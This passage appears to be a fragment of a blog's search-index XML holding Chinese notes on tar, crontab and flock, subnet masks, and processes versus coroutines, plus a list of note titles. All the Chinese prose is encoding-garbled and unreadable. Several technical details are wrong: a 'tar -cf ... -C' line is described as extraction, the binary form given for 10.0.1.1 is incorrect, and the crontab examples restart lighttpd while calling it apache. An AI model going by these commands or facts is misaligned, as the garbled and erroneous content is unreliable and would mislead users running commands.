href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h4><p>æŸ¥çœ‹<br><code>tar -tf note.tar.gz</code>   åœ¨ä¸è§£å‹çš„æƒ…å†µä¸‹æŸ¥çœ‹å‹ç¼©åŒ…çš„å†…å®¹  </p><p>å‹ç¼©<br><code>tar -cvf note.tar *.md</code> -cæ˜¯è¡¨ç¤ºäº§ç”Ÿæ–°çš„åŒ…ï¼Œ-fæŒ‡å®šåŒ…çš„æ–‡ä»¶å<br><code>tar -czf note.tar.gz *.md</code> ä½¿ç”¨gzipå‹ç¼©<br><code>tar -cjf note.tar.bz2 *.md</code> ä½¿ç”¨bzip2å‹ç¼©<br><code>tar -cZf note.tar.Z *.md</code> ä½¿ç”¨compresså‹ç¼©</p><p>è§£å‹<br><code>tar â€“xvf file.tar</code> è§£å‹taråŒ…<br><code>tar -xzvf file.tar.gz</code> è§£å‹tar.gz<br><code>tar -xjvf file.tar.bz2</code>  è§£å‹tar.bz2<br><code>tar â€“xZvf file.tar.Z</code> è§£å‹tar.Z</p><p>å…¶ä»–å‘½ä»¤<br><code>tar -rf note.tar tar_new.md</code> è¡¨ç¤ºè¿½åŠ note.mdåˆ°åŒ…ä¸­<br><code>tar -uf note.tar tar.md</code> è¡¨ç¤ºæ›´æ–°tar.mdæ–‡ä»¶<br><code>tar -cf note.tar -C ./output/</code> è§£å‹æ–‡ä»¶åˆ°outputç›®å½•ä¸­</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.cnblogs.com/peida/archive/2012/11/30/2795656.html">ã€1ã€‘</a> <a href="http://www.cnblogs.com/jyaray/archive/2011/04/30/2033362.html">ã€2ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>crontab</title>
      <link href="/post/crontab.html"/>
      <url>/post/crontab.html</url>
      
        <content type="html"><![CDATA[<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><h3 id="åŸºæœ¬æ ¼å¼"><a href="#åŸºæœ¬æ ¼å¼" class="headerlink" title="åŸºæœ¬æ ¼å¼"></a>åŸºæœ¬æ ¼å¼</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*ã€€ã€€*ã€€ã€€*ã€€ã€€*ã€€ã€€*ã€€ã€€command</span><br><span class="line">åˆ†ã€€ æ—¶ã€€ æ—¥ã€€ æœˆã€€ å‘¨ã€€ å‘½ä»¤</span><br></pre></td></tr></table></figure><ol><li>ç¬¬1åˆ—è¡¨ç¤ºåˆ†é’Ÿ1ï½59 æ¯åˆ†é’Ÿç”¨*æˆ–è€… *&#x2F;1è¡¨ç¤º</li><li>ç¬¬2åˆ—è¡¨ç¤ºå°æ—¶1ï½23ï¼ˆ0è¡¨ç¤º0ç‚¹ï¼‰</li><li>ç¬¬3åˆ—è¡¨ç¤ºæ—¥æœŸ1ï½31</li><li>ç¬¬4åˆ—è¡¨ç¤ºæœˆä»½1ï½12</li><li>ç¬¬5åˆ—æ ‡è¯†å·æ˜ŸæœŸ0ï½6ï¼ˆ0è¡¨ç¤ºæ˜ŸæœŸå¤©ï¼‰</li></ol><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>crontabæ–‡ä»¶çš„ä¸€äº›ä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 21 * * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯æ™šçš„21:30é‡å¯apacheã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯æœˆ1ã€10ã€22æ—¥çš„4 : 45é‡å¯apacheã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯å‘¨å…­ã€å‘¨æ—¥çš„1 : 10é‡å¯apacheã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0,30 18-23 * * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºåœ¨æ¯å¤©18 : 00è‡³23 : 00ä¹‹é—´æ¯éš”30åˆ†é’Ÿé‡å¯apacheã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 23 * * 6 /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯æ˜ŸæœŸå…­çš„11 : 00 pmé‡å¯apacheã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* */1 * * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>æ¯ä¸€å°æ—¶é‡å¯apache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 23-7/1 * * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>æ™šä¸Š11ç‚¹åˆ°æ—©ä¸Š7ç‚¹ä¹‹é—´ï¼Œæ¯éš”ä¸€å°æ—¶é‡å¯apache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 11 4 * mon-wed /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>æ¯æœˆçš„4å·ä¸æ¯å‘¨ä¸€åˆ°å‘¨ä¸‰çš„11ç‚¹é‡å¯apache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 6 * * *</span><br></pre></td></tr></table></figure><p>æ¯å¤©æ—©ä¸Š6ç‚¹10åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 */2 * * *</span><br></pre></td></tr></table></figure><p>æ¯ä¸¤ä¸ªå°æ—¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 23-7/2,8 * * *</span><br></pre></td></tr></table></figure><p>æ™šä¸Š11ç‚¹åˆ°æ—©ä¸Š8ç‚¹ä¹‹é—´æ¯ä¸¤ä¸ªå°æ—¶ï¼Œæ—©ä¸Š8ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 11 4 * mon-wed</span><br></pre></td></tr></table></figure><p>æ¯ä¸ªæœˆçš„4å·å’Œæ¯ä¸ªç¤¼æ‹œçš„ç¤¼æ‹œä¸€åˆ°ç¤¼æ‹œä¸‰çš„æ—©ä¸Š11ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 4 1 jan * </span><br></pre></td></tr></table></figure><p>1æœˆä»½æ—¥æ—©ä¸Š4ç‚¹</p><blockquote><p>*&#x2F;n ä»£è¡¨æ¯n&#x2F;å•ä½æ‰§è¡Œä¸€ä¸‹</p></blockquote><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><ol><li>crontab -e ç¼–è¾‘ä»»åŠ¡</li><li>crontab -l åˆ—å‡ºæ‰€æœ‰çš„ä»»åŠ¡</li><li>crontab -r åˆ é™¤æ‰€æœ‰çš„ä»»åŠ¡</li></ol><h3 id="æœåŠ¡ç®¡ç†"><a href="#æœåŠ¡ç®¡ç†" class="headerlink" title="æœåŠ¡ç®¡ç†"></a>æœåŠ¡ç®¡ç†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond [start|stop|restart|status]</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹crontabè¾“å‡ºæ—¥å¿—"><a href="#æŸ¥çœ‹crontabè¾“å‡ºæ—¥å¿—" class="headerlink" title="æŸ¥çœ‹crontabè¾“å‡ºæ—¥å¿—"></a>æŸ¥çœ‹crontabè¾“å‡ºæ—¥å¿—</h3><ul><li><p>Linux<br>ä½äº&#x2F;var&#x2F;log&#x2F;cron-* æ–‡ä»¶ä¸­</p></li><li><p>Mac</p></li></ul><h3 id="flock"><a href="#flock" class="headerlink" title="flock"></a>flock</h3><p>å¦‚æœä»»åŠ¡æ‰§è¡Œæ—¶é—´è¿‡é•¿è€Œé—´éš”å¤ªçŸ­å°±ä¼šå‡ºç°ä¸Šä¸ªä»»åŠ¡è¿˜æ²¡ç»“æŸä¸‹ä¸ªä»»åŠ¡å°±åˆå¼€å§‹æ‰§è¡Œäº†ï¼Œé•¿æœŸä¸‹å»ä¼šç»™ç³»ç»Ÿè´Ÿè½½é€ æˆå¾ˆå¤§å½±å“ã€‚é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œå¯ä»¥åˆ©ç”¨<code>flock</code>çš„é”æœºåˆ¶ä¿è¯åªæœ‰ä¸€ä¸ªä»»åŠ¡åœ¨æ‰§è¡Œã€‚</p><p>flockå‘½ä»¤å‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-s, --shared:    è·å¾—ä¸€ä¸ªå…±äº«é”  </span><br><span class="line">-x, --exclusive: è·å¾—ä¸€ä¸ªç‹¬å é”  </span><br><span class="line">-u, --unlock:    ç§»é™¤ä¸€ä¸ªé”ï¼Œé€šå¸¸æ˜¯ä¸éœ€è¦çš„ï¼Œè„šæœ¬æ‰§è¡Œå®Œä¼šè‡ªåŠ¨ä¸¢å¼ƒé”  </span><br><span class="line">-n, --nonblock:  å¦‚æœæ²¡æœ‰ç«‹å³è·å¾—é”ï¼Œç›´æ¥å¤±è´¥è€Œä¸æ˜¯ç­‰å¾…  </span><br><span class="line">-w, --timeout:   å¦‚æœæ²¡æœ‰ç«‹å³è·å¾—é”ï¼Œç­‰å¾…æŒ‡å®šæ—¶é—´  </span><br><span class="line">-o, --close:     åœ¨è¿è¡Œå‘½ä»¤å‰å…³é—­æ–‡ä»¶çš„æè¿°ç¬¦å·ã€‚ç”¨äºå¦‚æœå‘½ä»¤äº§ç”Ÿå­è¿›ç¨‹æ—¶ä¼šä¸å—é”çš„ç®¡æ§  </span><br><span class="line">-c, --command:   åœ¨shellä¸­è¿è¡Œä¸€ä¸ªå•ç‹¬çš„å‘½ä»¤  </span><br><span class="line">-h, --help       æ˜¾ç¤ºå¸®åŠ©  </span><br><span class="line">-V, --version:   æ˜¾ç¤ºç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p>ä¾‹å­ï¼š</p><ol><li><p>é˜²æ­¢<code>rsync</code>é‡å¤æ‰§è¡Œ</p><p> å…ˆåˆ›å»ºä¸€ä¸ªlockæ–‡ä»¶ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /var/run/rsync.lock</span><br></pre></td></tr></table></figure><p> é…ç½®crontabï¼š</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 * * * * flock -xn /var/run/rsync.lock -c &#x27;rsync -avz src dest &gt;/dev/null 2&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.jb51.net/LINUXjishu/19905.html">Linux crontabå®šæ—¶æ‰§è¡Œä»»åŠ¡</a></li><li><a href="https://blog.csdn.net/qivan/article/details/53836426">linuxä¹‹crontabå®šæ—¶æ‰§è¡Œå‘½ä»¤èµ°è¿‡çš„å‘å‘</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> crontab </tag>
            
            <tag> flock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­ç½‘æ©ç </title>
      <link href="/post/ip-mask.html"/>
      <url>/post/ip-mask.html</url>
      
        <content type="html"><![CDATA[<h2 id="å­ç½‘æ©ç "><a href="#å­ç½‘æ©ç " class="headerlink" title="å­ç½‘æ©ç "></a>å­ç½‘æ©ç </h2><h3 id="ip-maskå†™æ³•"><a href="#ip-maskå†™æ³•" class="headerlink" title="ip&#x2F;maskå†™æ³•"></a>ip&#x2F;maskå†™æ³•</h3><p>åœ¨é…ç½®é˜²ç«å¢™æ—¶æœ‰æ—¶é—´éœ€è¦å¯¹æŸä¸ªIPæ®µè¿›è¡ŒåŒ¹é…ï¼Œé˜²ç«å¢™IPæ®µç”¨IP&#x2F;MASKæ–¹å¼è¡¨ç¤ºã€‚</p><p>MASKçš„å–å€¼å¯ä»¥æ˜¯1åˆ°32ï¼Œå› ä¸ºIPåœ°å€çš„äºŒè¿›åˆ¶åˆšå¥½æ˜¯32ä½ã€‚</p><p><code>10.0.1.1/24</code>è¡¨ç¤ºä¸€ä¸ªæ˜¯å­ç½‘æ©ç ä¸º24çš„<code>10.0.1.1</code>çš„IPåœ°å€ã€‚<code>10.0.1.1</code>çš„äºŒè¿›åˆ¶æ˜¯<code>00001010.00001010.00001010.00000001</code>ã€‚<code>10.0.1.1/24</code> è¯´æ˜äº†å­ç½‘æ©ç é®ä½äº†24ä½ï¼Œä¹Ÿè¯´æ˜äº†è¿™ä¸ªIPçš„<code>ç½‘ç»œå·net_id</code>æ˜¯24ä½ï¼Œç½‘æ®µå äº†24ä½ã€‚</p><p><strong>ç®€å•ç‚¹è¯´<code>10.0.1.1/24</code>ç­‰åŒäº<code>10.0.1.*</code></strong></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://zhihu.com/question/29723388/answer/50704994">å­ç½‘æ©ç ä¸ipåœ°å€æœ‰å®é™…å…³ç³»å—ï¼Ÿ</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è¿›ç¨‹çº¿ç¨‹åç¨‹</title>
      <link href="/post/process-thread-coroutine.html"/>
      <url>/post/process-thread-coroutine.html</url>
      
        <content type="html"><![CDATA[<h3 id="è¿›ç¨‹-çº¿ç¨‹-åç¨‹"><a href="#è¿›ç¨‹-çº¿ç¨‹-åç¨‹" class="headerlink" title="è¿›ç¨‹-&gt;çº¿ç¨‹-&gt;åç¨‹"></a>è¿›ç¨‹-&gt;çº¿ç¨‹-&gt;åç¨‹</h3><p>åœ¨ç°å®ä¸–ç•Œä¸­ï¼ŒåŸºæœ¬æ˜¯æ˜¯æŒ‰ç€è¿™æ ·çš„é¡ºåºæ¼”åŒ–ï¼šprocessâ€“&gt;threadâ€“&gt;coroutine&#x2F;fiber å…¶å®æ˜¯ä¸€ä¸ª context åˆ‡æ¢å¼€é”€ä»å¤§åˆ°å°çš„æ¼”åŒ–ï¼Œprocess åˆ‡æ¢å¼€é”€æœ€å¤§ï¼Œéœ€è¦åˆ‡æ¢åœ°å€ç©ºé—´ï¼Œæ‰€æœ‰çš„ CPU çŠ¶æ€ï¼Œæ‰€æœ‰å…¶ä»–èµ„æº thread åˆ‡æ¢åªéœ€è¦åˆ‡æ¢ CPU çŠ¶æ€ï¼Œå½“ç„¶æ˜¯å¤§éƒ¨åˆ†çš„ CPU çŠ¶æ€ï¼Œè€Œ coroutine åˆ‡æ¢ï¼Œåªéœ€è¦åˆ‡æ¢å¾ˆå°‘çš„ CPU çŠ¶æ€ï¼Œè€Œä¸”å…¨éƒ¨éƒ½åœ¨ç”¨æˆ·åœ°å€ç©ºé—´è¿è¡Œï¼Œä¸éœ€è¦åˆ°å†…æ ¸ç©ºé—´ã€‚</p><ul><li>threadä¹‹é–“éœ€è¦context-switchï¼Œè€Œä¸”æˆæœ¬å¾ˆé«˜ï¼Œä½†æ˜¯coroutineä¹‹é–“çš„åˆ‡æ›å¾ˆå¿«</li><li>coroutineçš„æˆæœ¬å¾ˆä½ï¼Œå¯ä»¥å¾ˆè¼•æ˜“çš„ç”¢ç”Ÿå¤§é‡çš„coroutine</li><li>é€™äº›äº‹æƒ…å…¨æ˜¯åœ¨åŒä¸€å€‹threadè£¡ç™¼ç”Ÿçš„ï¼Œ<del>å› æ­¤ä¸æœƒæœ‰race conditionç­‰å•é¡Œç™¼ç”Ÿ</del> (é‚„æ˜¯å¯èƒ½æœƒæœ‰)</li><li>threadçš„context-switché›–ç„¶æˆ‘å€‘å¯ä»¥é€²è¡ŒæŸç¨®ç¨‹åº¦çš„æ§åˆ¶ï¼Œä½†æ˜¯å¾ˆå¤šéƒ¨ä»½é‚„æ˜¯å¾—é OSä¾†æ±ºå®šè¦å…ˆæ’ç¨‹å“ªå€‹threadï¼Œè€Œcoroutineçš„åŸ·è¡Œæ˜¯ç”±æˆ‘å€‘è‡ªå·±æ§åˆ¶çš„</li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://blog.csdn.net/whinah/article/details/3501276">processâ€“&gt;threadâ€“&gt;coroutine</a></li><li><a href="http://blog.ez2learn.com/2010/07/17/talk-about-coroutine-and-gevent/">æ·ºè«‡coroutineèˆ‡gevent</a></li><li><a href="https://www.zhihu.com/question/20511233/answer/24260355">åç¨‹çš„å¥½å¤„æœ‰å“ªäº›ï¼Ÿ</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> process </tag>
            
            <tag> thread </tag>
            
            <tag> coroutine </tag>
            
            <tag> fiber </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>README</title>
      <link href="/post/README.html"/>
      <url>/post/README.html</url>
      
        <content type="html"><![CDATA[<ul><li><input checked="" disabled="" type="checkbox"> <a href="brew.md">brew.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="JavaScript==%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.md">JavaScript&#x3D;&#x3D;ä¸­çš„ç±»å‹è½¬æ¢.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="JavaScript%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.md">JavaScriptç±»å‹è½¬æ¢.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Linux%E6%97%B6%E5%8C%BA.md">Linuxæ—¶åŒº.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="SSH.md">SSH.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="apt.md">apt.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="cdn.md">cdn.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="elasticsearch.md">elasticsearch.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-elasticsearch.md">install-elasticsearch.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-kibana.md">install-kibana.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-logstash.md">install-logstash.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5.md">æ—¶é—´åŒæ­¥.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="kibana.md">kibana.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="logstash.md">logstash.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="node%E6%A8%A1%E5%9D%97%E6%9F%A5%E6%89%BE%E7%AD%96%E7%95%A5.md">nodeæ¨¡å—æŸ¥æ‰¾ç­–ç•¥.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="npm.md">npm.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="vscode-keymap.md">vscode-keymap.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="yum-zip.md">yum-zip.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%A0%91%E8%8E%93%E6%B4%BE%E8%93%9D%E7%89%99.md">æ ‘è“æ´¾è“ç‰™.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C.md">è™šæ‹Ÿæœºç½‘ç»œ.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%A0%91%E8%8E%93%E6%B4%BE%E8%AE%BE%E7%BD%AEWIFI.md">æ ‘è“æ´¾è®¾ç½®WIFI.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%A0%91%E8%8E%93%E6%B4%BE%E6%91%84%E5%83%8F%E5%A4%B4%E6%8C%82%E8%BD%BD.md">æ ‘è“æ´¾æ‘„åƒå¤´æŒ‚è½½.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.md">æ ‘è“æ´¾å®‰è£…æ“ä½œç³»ç»Ÿ.md</a></li><li><input disabled="" type="checkbox"> <a href="git-submodules.md">gitå­æ¨¡å—</a></li><li><input checked="" disabled="" type="checkbox"> <a href="iptables.md">iptables.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="atom-keymap.md">atom-keymap.md</a></li><li><input disabled="" type="checkbox"> <a href="process-thread-coroutine.md">è¿›ç¨‹çº¿ç¨‹åç¨‹</a></li><li><input checked="" disabled="" type="checkbox"> <a href="crontab.md">crontab.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="ip-mask.md">ip-mask.md</a></li><li><input disabled="" type="checkbox"> <a href="python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81.md">pythonå­—ç¬¦ç¼–ç .md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E5%AE%89%E8%A3%85nginx.md">å®‰è£…nginx.md</a></li><li><input disabled="" type="checkbox"> <a href="nginx%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97.md">nginxå¸¸ç”¨æ¨¡å—.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="tar.md">tar.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="yum.md">yum.md</a></li><li><input disabled="" type="checkbox"> <a href="express-view.md">express-view.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="cookie.md">cookie.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https.md">https.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="supervisor.md">supervisor.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="undefined.md">undefined.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="typeof&instanceof.md">typeof&amp;instanceof.md</a></li><li><input disabled="" type="checkbox"> <a href="%E9%97%AD%E5%8C%85.md">é—­åŒ….md</a></li><li><input disabled="" type="checkbox"> <a href="etag.md">etag.md</a></li><li><input disabled="" type="checkbox"> <a href="redis.md">redis</a></li><li><input checked="" disabled="" type="checkbox"> <a href="java-redis-session.md">java-redis-session.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8.md">nginxå¼€æœºå¯åŠ¨.md</a></li><li><input disabled="" type="checkbox"> <a href="linux-chkconfig.md">linux-chkconfig.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-openresty.md">install-openresty.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-grep.md">linux-grep.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http-cache.md">HTTPç¼“å­˜.md</a></li><li><input disabled="" type="checkbox"> <a href="%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%97%B6%E9%97%B4%E8%A1%A8%E7%A4%BA.md">è®¡ç®—æœºä¸­çš„æ—¶é—´è¡¨ç¤º.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-kernel.md">Linuxå†…æ ¸</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.md">ç¯å¢ƒå˜é‡</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Linux%E9%87%8D%E5%AE%9A%E5%90%91.md">Linuxé‡å®šå‘</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Mac%E4%B8%8D%E8%83%BD%E6%B8%85%E7%A9%BA%E5%BA%9F%E7%BA%B8%E7%AF%93.md">Macä¸èƒ½æ¸…ç©ºåºŸçº¸ç¯“</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mongoose-validation.md">mongoose-validation</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-docker.md">install-docker</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-%E7%AB%AF%E5%8F%A3.md">linux-ç«¯å£</a></li><li><input checked="" disabled="" type="checkbox"> <a href="fish-shell.md">fish-shell</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.md">linux-å¸¸ç”¨å‘½ä»¤</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Docker%E7%9A%84%E9%95%9C%E5%83%8F%E5%AD%98%E6%94%BE%E7%9B%AE%E5%BD%95%E4%BF%AE%E6%94%B9%E4%B8%8E%E8%BF%81%E7%A7%BB.md">Dockerçš„é•œåƒå­˜æ”¾ç›®å½•ä¿®æ”¹ä¸è¿ç§»</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E9%98%BF%E9%87%8C%E4%BA%91docker%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F.md">é˜¿é‡Œäº‘dockeré•œåƒåŠ é€Ÿ</a></li><li><input disabled="" type="checkbox"> <a href="OpenResty%E6%80%BB%E7%BB%93.md">OpenRestyæ€»ç»“</a></li><li><input disabled="" type="checkbox"> <a href="Node.js%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5.md">Node.jsæ€§èƒ½é—®é¢˜æ’æŸ¥</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Install-Docker-Compose.md">Install-Docker-Compose</a></li><li><input disabled="" type="checkbox"> <a href="zip.md">zip</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http://t.cn/RfGBh0H">Linuxä¿¡å·æœºåˆ¶</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http://t.cn/Rftexm0">VSCodeæ™ºèƒ½æç¤º</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-location.md">nginx-location</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-virtual-host.md">Nginxè™šæ‹Ÿä¸»æœº</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-http-limit.md">Nginxé™æµ</a></li><li><input checked="" disabled="" type="checkbox"> <a href="telnet.md">telnet</a>  </li><li><input checked="" disabled="" type="checkbox"> <a href="ab.md">ab</a>  </li><li><input checked="" disabled="" type="checkbox"> <a href="pip.md">pip</a></li><li><input checked="" disabled="" type="checkbox"> <a href="python-virtualenv.md">python-virtualenv</a></li><li><input checked="" disabled="" type="checkbox"> <a href="tensorflow.md">tensorflow</a></li><li><input checked="" disabled="" type="checkbox"> <a href="protobuf.md">protobuf</a></li><li><input disabled="" type="checkbox"> <a href="notebook.md">notebook</a></li><li><input checked="" disabled="" type="checkbox"> <a href="iotop.md">iotop</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-python.md">install-python</a></li><li><input disabled="" type="checkbox"> <a href="gnu-paralell.md">gnu-paralell</a></li><li><input disabled="" type="checkbox"> <a href="pigz.md">pigz</a></li><li><input checked="" disabled="" type="checkbox"> <a href="VirtualBox-CentOS7.md">VirtualBox-CentOS7</a></li><li><input checked="" disabled="" type="checkbox"> <a href="rsync.md">rsync</a></li><li><input checked="" disabled="" type="checkbox"> <a href="synchronousVSasynchronous&blockingVSnon-blocking.md">åŒæ­¥&#x2F;å¼‚æ­¥&amp;é˜»å¡&#x2F;éé˜»å¡</a></li><li><input checked="" disabled="" type="checkbox"> <a href="web-messaging.md">webé€šä¿¡</a></li><li><input checked="" disabled="" type="checkbox"> <a href="eslint.md">ESLint</a></li><li><input checked="" disabled="" type="checkbox"> <a href="node_modules.md">node_modules</a></li><li><input checked="" disabled="" type="checkbox"> <a href="page-auto-refresh.md">é¡µé¢è‡ªåŠ¨åˆ·æ–°</a></li><li><input disabled="" type="checkbox"> <a href="curl.md">curl</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mysql.md">mysql</a></li><li><input disabled="" type="checkbox"> <a 